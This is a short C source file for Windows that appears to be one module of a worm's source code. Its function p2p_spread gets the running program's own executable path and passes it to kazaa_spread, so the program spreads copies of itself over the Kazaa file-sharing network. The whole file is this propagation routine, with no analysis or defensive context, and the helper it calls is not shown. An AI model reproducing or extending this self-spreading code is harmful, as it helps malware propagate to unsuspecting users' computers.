#include "data_globals.h"
#include <windows.h>

#pragma optimize("", off)
void p2p_spread(void)
{
    char selfpath[MAX_PATH];
    GetModuleFileNameA(NULL, selfpath, MAX_PATH);
    kazaa_spread(selfpath);
}
#pragma optimize("", on)
